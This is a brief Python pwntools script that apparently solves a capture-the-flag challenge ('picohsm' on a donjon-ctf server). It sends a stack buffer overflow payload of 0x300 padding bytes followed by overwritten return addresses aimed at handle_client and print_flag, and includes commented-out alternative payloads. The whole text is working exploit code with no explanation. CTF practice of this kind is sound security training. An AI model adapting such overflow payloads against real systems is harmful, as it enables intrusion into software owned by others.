from pwn import *

def recvuntil(bytes_str):
    print("< " + conn.recvuntil(bytes_str).decode("utf-8"))

#port: one value between 8001 and 8010
port = 8003
conn = remote('picohsm.donjon-ctf.io', port)
recvuntil(b'15 seconds...\n')

R4_saved_value = p32(0xe1001fd8)
handle_client = p32(0x0800071c + 1)
print_flag = p32(0x0800040a + 1)
socket_t_value = p32(0xe1000010)
null_bytes = p32(0x0)
garbage = p32(0x0)

conn.send(b'a'*0x300 + garbage + handle_client)

#conn.send(b'a'*0x300 + R4_saved_value + print_flag)
#this also works:
#conn.send(b'a'*0x300 + R4_saved_value + print_flag + socket_t_value + null_bytes)

print(conn.recvline().decode("utf-8"))
print(conn.recvall(timeout=2).decode("utf-8"))